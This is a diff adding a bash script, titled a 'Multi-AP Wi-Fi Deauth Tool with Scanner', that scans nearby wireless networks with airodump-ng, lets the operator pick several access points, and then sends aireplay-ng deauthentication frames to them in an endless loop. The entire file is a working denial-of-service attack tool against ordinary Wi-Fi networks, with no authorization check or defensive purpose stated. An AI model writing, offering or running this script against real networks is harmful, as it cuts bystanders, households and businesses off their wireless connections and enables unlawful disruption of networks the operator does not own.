@@ -1,0 +1,93 @@
+#!/bin/bash
+
+# ───────── CONFIGURATION ─────────
+IFACE="wlan0mon"
+SCAN_BASE="/tmp/wifi_scan"
+CSV="${SCAN_BASE}-01.csv"
+TARGET_FILE="/tmp/dos_targets.txt"
+DEAUTH_COUNT=10
+DELAY=1
+
+# ───────── COLORS ─────────
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# ───────── CLEANUP ON EXIT ─────────
+trap ctrl_c INT
+function ctrl_c() {
+    echo -e "\n${YELLOW}[!] Stopping attack and cleaning up...${NC}"
+    rm -f $SCAN_BASE*
+    exit 0
+}
+
+# ───────── SCAN NETWORKS ─────────
+scan_networks() {
+    echo -e "${GREEN}[*] Scanning for 60s using $IFACE...${NC}"
+    rm -f ${SCAN_BASE}* $TARGET_FILE selected.txt
+
+    # Launch airodump-ng in background
+    airodump-ng $IFACE --band ab --write $SCAN_BASE --output-format csv > /dev/null 2>&1 &
+    PID=$!
+
+    sleep 60
+    kill $PID 2>/dev/null
+
+    if [[ ! -f "$CSV" ]]; then
+        echo -e "${RED}[!] Scan failed: $CSV not found.${NC}"
+        echo -e "${RED}[!] Either: (1) No networks detected, (2) Interface issue, (3) Not in monitor mode.${NC}"
+        exit 1
+    fi
+
+    echo -e "\n${GREEN}========== Available Wi-Fi Networks ==========${NC}"
+    awk -F ',' '
+    /WPA|WEP|OPN/ && $1 ~ /([0-9A-F]{2}:){5}/ {
+        gsub(/^ +| +$/, "", $1);
+        gsub(/^ +| +$/, "", $4);
+        gsub(/^ +| +$/, "", $14);
+        band = ($4 <= 14) ? "2.4GHz" : "5GHz";
+        printf "[%d] %-17s | CH: %-2s | BAND: %-6s | SSID: %s\n", NR, $1, $4, band, $14;
+        print $1 "," $4 >> "'$TARGET_FILE'"
+    }' "$CSV"
+    echo -e "${GREEN}===============================================${NC}"
+}
+
+# ───────── SELECT TARGETS ─────────
+select_targets() {
+    echo
+    read -p "[?] How many APs do you want to target? " COUNT
+
+    > selected.txt
+    for ((i=1; i<=COUNT; i++)); do
+        read -p "[→] Enter AP #$i (from list): " NUM
+        TARGET=$(sed -n "${NUM}p" $TARGET_FILE)
+        if [[ -n "$TARGET" ]]; then
+            echo "$TARGET" >> selected.txt
+        else
+            echo -e "${RED}[!] Invalid selection: $NUM${NC}"
+        fi
+    done
+}
+
+# ───────── DEAUTH ATTACK LOOP ─────────
+run_attack() {
+    echo -e "\n${GREEN}[*] Starting deauth attack... Press Ctrl+C to stop.${NC}"
+    sleep 2
+
+    while true; do
+        while IFS=',' read -r MAC CH; do
+            echo -e "${YELLOW}[→] Attacking $MAC on channel $CH...${NC}"
+            iwconfig $IFACE channel $CH
+            aireplay-ng --deauth $DEAUTH_COUNT -a $MAC $IFACE > /dev/null 2>&1
+            sleep $DELAY
+        done < selected.txt
+    done
+}
+
+# ───────── MAIN EXECUTION ─────────
+clear
+echo -e "${GREEN}=== Multi-AP Wi-Fi Deauth Tool with Scanner ===${NC}"
+scan_networks
+select_targets
+run_attack
